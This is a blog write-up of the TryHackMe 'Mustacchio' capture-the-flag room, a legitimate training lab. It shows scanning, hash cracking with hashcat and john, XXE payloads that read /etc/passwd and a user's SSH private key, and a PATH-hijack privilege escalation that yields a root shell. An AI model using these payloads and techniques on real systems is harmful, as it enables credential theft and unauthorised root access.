---
layout: post
current: post
cover: 'assets/images/mustacchio/cover.png'
navigation: True
title: "Mustacchio Write Up"
date: 2021-08-12 00:00:00
tags: [tryhackme, ctf, easy]
class: post-template
subclass: 'post'
author: darryn
---
![cover](/assets/images/mustacchio/cover.png)

### Overview

[mustacchio](https://tryhackme.com/room/mustacchio) is a easy rated CTF room on [TryHackMe](https://tryhackme.com) created by [zyeinn](https://tryhackme.com/p/zyeinn).

### Nmap

Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports.

```highlight
└──╼ $sudo nmap -sC -sV -oA nmap/initial mustacchio.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:04 BST
Nmap scan report for mustacchio.thm (10.10.41.138)
Host is up (0.031s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
```

2 Ports open:

- 22 - SSH - OpenSSH 7.2p2
- 80 - HTTP - Apache 2.4.18

I also ran a full port scan and found 1 additional port:

```highlight
└──╼ $nmap -p- -oA nmap/full mustacchio.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:07 BST
Nmap scan report for mustacchio.thm (10.10.41.138)
Host is up (0.032s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

Nmap done: 1 IP address (1 host up) scanned in 119.61 seconds
```

### Enumeration

I started with port 80 and was presented with a very basic web page, there isnt really any functionally on the pages.

![index](/assets/images/mustacchio/index.png)

I ran a gobuster to check for other directories. 

```highlight
└──╼ $gobuster dir -u http://mustacchio.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 75
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mustacchio.thm
[+] Threads:        75
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/08/12 11:11:22 Starting gobuster
===============================================================
/images (Status: 301)
/fonts (Status: 301)
/custom (Status: 301)
/server-status (Status: 403)
===============================================================
2021/08/12 11:11:34 Finished
===============================================================
```

/custom could be interesting.

![custom](/assets/images/mustacchio/custom.png)

Looking in the js folder I found a file called users.bak, I downloaded the file to my machine.

![usersbak](/assets/images/mustacchio/usersbak.png)

Its a SQLite database.

```highlight
└──╼ $file users.bak 
users.bak: SQLite 3.x database, last written using SQLite version 3034001
```

The database has one table called users with one record which is the username 'admin' and a hashed password which ive redacted from the output.

```highlight
└──╼ $sqlite3 users.bak
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
admin|<REDACTED>
sqlite> 
```

The hash is SHA1, a great tool to use to identify hashes is hash-identifier.

```highlight
└──╼ $hash-identifier                                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: <REDACTED>

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

I put the hash in a file called 'hash' and then used hashcat to crack it with the command ```hashcat -m 100 hash /usr/share/wordlists/rockyou.txt --force```. 

The hash cracked within a few seconds, I looked around the webpage to find somewhere I could use the credentials but couldn't find anything.

I turned my attention to the other port 8765 and got an admin panel. 

![login](/assets/images/mustacchio/login.png)

I logged in with the credentials and was presented with a page to add a comment.

![comment](/assets/images/mustacchio/comment.png)

Looking at the source code, 3 things jumped out.

![source](/assets/images/mustacchio/source.png)

1) Another backup file is referenced

2) A username of Barry and a breadcumb to grab an SSH key if possible

3) A reference to XML being used

Clicking submit without any input presents an alert 'Insert XML Code!'.

![insertcode](/assets/images/mustacchio/insertcode.png)

I downloaded the dontforget.bak file by browsing to: http://mustacchio.thm:8765/auth/dontforget.bak

Looking at the file its an XML example.

```highlight
└──╼ $cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessl
y and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now sin
ce this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playin
g with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that
 you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```
I tried the example on the webpage and got the expected result.

![test](/assets/images/mustacchio/test.png)

### Initial Access

It appears the next step is to use XML External Entiry (XXE) to grab barry's SSH key to allow us to connect to the machine. Learning XXE is very much on my to do list so I went over to [port swigger academy](https://portswigger.net/web-security/xxe) which has a great training resource and found the following payload:

```highlight
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

Using the original example and the payload above I created my own payload to test XXE.

```highlight
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<comment>
  <name>Daz</name>
  <author>Please work...</author>
  <com>&xxe;</com>
</comment>
```

It worked! 

![testworked](/assets/images/mustacchio/testworked.png)

I tweaked the payload to grab barrys SSH key.

```highlight
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
<comment>
  <name>Daz</name>
  <author>Please work...</author>
  <com>&xxe;</com>
</comment>
```

Again this worked, however looking at the key it is encrypted so before I can use it to login I need to crack it.

```highlight
  GNU nano 4.9.2                                       
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
<redacted>
```

I used ssh2john to generate a hash and saved it to a file called keyhash.

```highlight
└──╼ $/usr/share/john/ssh2john.py key > keyhash
```

Then using john and the rockyou wordlist I was able to get the keys password.

```highlight
└──╼ $john keyhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted>       (key)
1g 0:00:00:05 DONE (2021-08-12 11:30) 0.1779g/s 2551Kp/s 2551Kc/s 2551KC/sa6_123..*7¡Vamos!
Session completed
```

To use the key I used chmod 600 and was able to login.

```highlight
└──╼ $chmod 600 key
┌─[daz@parrot]─[~/Documents/TryHackMe/Mustacchio]
└──╼ $ssh -i key barry@mustacchio.thm
Enter passphrase for key 'key': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Aug 12 10:31:58 2021 from 10.8.21.217
barry@mustacchio:~$ 
```

### Priv Esc

While enumerating the machine I found another user directory. Within this directory was a ELF file owned by root but executable by all.

```highlight
barry@mustacchio:~$ cd /home/joe/
barry@mustacchio:/home/joe$ ls
live_log
barry@mustacchio:/home/joe$ file live_log 
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a455189
64ad12abe, for GNU/Linux 3.2.0, not stripped
barry@mustacchio:/home/joe$ ls -lah live_log 
-rwsr-xr-x 1 root root 17K Jun 12 15:48 live_log
barry@mustacchio:/home/joe$ 
```

Running the file it appears to just be reading the HTTP access logs for port 8765.

```highlight
barry@mustacchio:/home/joe$ ./live_log 
10.8.21.217 - - [12/Aug/2021:10:20:02 +0000] "GET /home.php HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.21.217 - - [12/Aug/2021:10:20:27 +0000] "POST /home.php HTTP/1.1" 200 1077 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0"
10.8.21.217 - - [12/Aug/2021:10:21:00 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0"
10.8.21.217 - - [12/Aug/2021:10:23:47 +0000] "GET /auth/dontforget.bak HTTP/1.1" 200 996 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.21.217 - - [12/Aug/2021:10:25:24 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0"
10.8.21.217 - - [12/Aug/2021:10:25:25 +0000] "POST /home.php HTTP/1.1" 200 1563 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0"
10.8.21.217 - - [12/Aug/2021:10:26:37 +0000] "GET /home.php HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.21.217 - - [12/Aug/2021:10:27:01 +0000] "POST /home.php HTTP/1.1" 200 1782 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0"
10.8.21.217 - - [12/Aug/2021:10:27:39 +0000] "GET /home.php HTTP/1.1" 200 1077 "-" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"
10.8.21.217 - - [12/Aug/2021:10:28:20 +0000] "POST /home.php HTTP/1.1" 200 2573 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0"
^CLive Nginx Log Readerbarry@mustacchio:/home/joe$ 
```

I used strings to look at the file and found the line:

tail -f /var/log/nginx/access.log

Because the tail command is not using an absolute path, we should be able to get privilege escalation by using the PATH variable. Raj Chandel has a great [blog](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/) about this technique.

```highlight
barry@mustacchio:/home/joe$ 
barry@mustacchio:/home/joe$ cd /tmp
barry@mustacchio:/tmp$ echo "/bin/bash" > tail
barry@mustacchio:/tmp$ chmod +x tail 
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/tmp$ /home/joe/live_log 
root@mustacchio:/tmp# whoami
root
root@mustacchio:/tmp# 
```

Thanks for reading!


